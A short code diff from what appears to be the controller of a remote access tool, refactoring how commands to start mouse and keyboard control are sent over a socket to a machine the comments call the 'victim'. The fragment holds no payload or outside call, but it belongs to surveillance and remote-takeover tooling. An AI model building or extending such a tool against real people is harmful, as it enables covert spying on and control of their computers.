@@ -100,11 +100,9 @@ def handleCommand(cmd, mainSock):
 			elif args[0] == "audio":
 				print("TODO - NOT YET IMPLEMENTED")
 			elif args[0] == "mouse":
-				mainSock.sendall(bytes([START_MOUSE]) + b'\0')
-				gui.toggleMouse(True, mainSock)
+				gui.toggleMouse(True, mainSock) # tells victim to start mouse
 			elif args[0] == "keys":
-				mainSock.sendall(bytes([START_KEYS]) + b'\0')
-				gui.toggleKeyboard(True, mainSock)
+				gui.toggleKeyboard(True, mainSock) # tells victim to start keys
 		elif args[1] == "stop":
 			if args[0] == "video":
 				gui.toggleVideo(False, mainSock) # tells victim to end video, keys, and mouse
